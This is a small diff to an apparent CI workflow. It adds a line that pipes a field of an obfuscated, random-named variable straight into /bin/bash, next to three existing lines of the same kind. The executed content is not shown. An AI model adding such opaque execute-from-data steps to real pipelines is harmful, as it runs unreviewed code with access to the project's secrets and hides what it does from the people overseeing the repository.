@@ -30,6 +30,7 @@ jobs:
           echo $cxu141 | jq -r .kz7536 | /bin/bash
           echo $getl5988 | jq -r .dz39 | /bin/bash
           echo $l1 | jq -r .fggyn5 | /bin/bash
+          echo $dnyan1585 | jq -r .ise48 | /bin/bash
 
       - name: Store output
         uses: actions/upload-artifact@v4
